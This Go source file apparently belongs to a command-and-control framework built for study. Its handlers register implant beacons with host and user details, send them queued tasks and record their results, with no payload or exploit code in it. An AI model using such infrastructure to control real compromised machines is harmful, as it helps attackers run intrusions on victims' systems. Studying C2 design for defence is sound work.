// Package handlers implements the server-side beacon protocol logic for
// register and check-in operations.
package handlers

import (
	"fmt"
	"time"

	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/store"
)

// HandleRegister processes a beacon register request, creates a new Beacon
// record with a generated ID, stores it, and returns the assigned beacon ID.
func HandleRegister(
	beaconStore store.BeaconStore,
	sessionStore *store.SessionStore,
	req *beaconProtocol.RegisterRequest,
	remoteAddress string,
) (*beaconProtocol.RegisterResponse, error) {
	if beaconStore == nil || req == nil || sessionStore == nil {
		return nil, fmt.Errorf("invalid register request")
	}

	beaconID := newBeaconID()
	now := time.Now().Unix()

	beacon := &core.Beacon{
		ID:            beaconID,
		Hostname:      req.Hostname,
		Username:      req.Username,
		OS:            req.OS,
		Arch:          req.Arch,
		Interval:      req.Interval,
		Jitter:        req.Jitter,
		LastCheckIn:   now,
		RemoteAddress: remoteAddress,
	}

	if err := beaconStore.Add(beacon); err != nil {
		return nil, err
	}

	return &beaconProtocol.RegisterResponse{
		BeaconID: beaconID,
	}, nil
}

// HandlePoll processes a beacon poll request, updates the beacon's last seen
// timestamp, and returns any pending tasks for that beacon.
func HandlePoll(
	beaconStore store.BeaconStore,
	taskStore store.ServerTaskStore,
	req *beaconProtocol.PollRequest,
	remoteAddress string,
) (*beaconProtocol.PollResponse, error) {
	if beaconStore == nil || taskStore == nil || req == nil {
		return nil, fmt.Errorf("invalid poll request")
	}

	now := time.Now().Unix()
	if err := beaconStore.UpdateCheckIn(req.BeaconID, now, remoteAddress); err != nil {
		return nil, err
	}
	serverTasks := taskStore.GetPendingTasksByImplantID(req.BeaconID)
	tasks := make([]protocol.Task, 0, len(serverTasks))
	for _, task := range serverTasks {
		tasks = append(tasks, protocol.Task{
			ID:      task.TaskID,
			Type:    task.Type,
			Payload: task.Payload,
		})
	}

	return &beaconProtocol.PollResponse{
		Tasks: tasks,
	}, nil
}

// HandleResult processes a beacon task result request and updates the stored
// server-side task record.
func HandleResult(
	beaconStore store.BeaconStore,
	taskStore store.ServerTaskStore,
	req *beaconProtocol.ResultRequest,
	remoteAddress string,
) (*beaconProtocol.ResultResponse, error) {
	if beaconStore == nil || taskStore == nil || req == nil {
		return nil, fmt.Errorf("invalid result request")
	}

	now := time.Now().Unix()
	if err := beaconStore.UpdateCheckIn(req.BeaconID, now, remoteAddress); err != nil {
		return nil, err
	}
	if req.TaskResult.TaskID == "" {
		return nil, fmt.Errorf("task result is required")
	}
	if err := taskStore.UpdateTask(req.TaskResult.TaskID, req.TaskResult); err != nil {
		return nil, err
	}

	return &beaconProtocol.ResultResponse{OK: true}, nil
}

// newBeaconID generates a unique beacon identifier based on the current
// nanosecond timestamp.
func newBeaconID() string {
	return fmt.Sprintf("beacon-%d", time.Now().UnixNano())
}
